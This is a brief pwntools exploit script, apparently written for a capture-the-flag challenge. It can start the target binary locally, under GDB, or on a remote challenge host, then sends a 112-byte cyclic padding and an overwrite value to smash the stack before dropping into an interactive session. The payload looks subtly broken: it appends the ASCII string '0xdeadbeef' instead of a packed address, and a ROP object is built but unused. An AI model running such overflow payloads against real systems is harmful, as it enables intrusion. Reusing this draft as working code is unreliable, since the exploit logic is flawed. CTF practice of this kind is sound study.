from pwn import *

binary = args.BIN

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary)
r = ROP(e)

if args.REMOTE:
   HOST = '0.cloud.chals.io' 
   PORT=26749
else:
   pass

gs = '''
continue
'''

def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    elif args.REMOTE:
        return remote(HOST,PORT)
    else:
        return process(e.path)


p = start()
pause()
chain = cyclic(112)
chain += b'0xdeadbeef'

p.sendline(chain)
p.interactive()
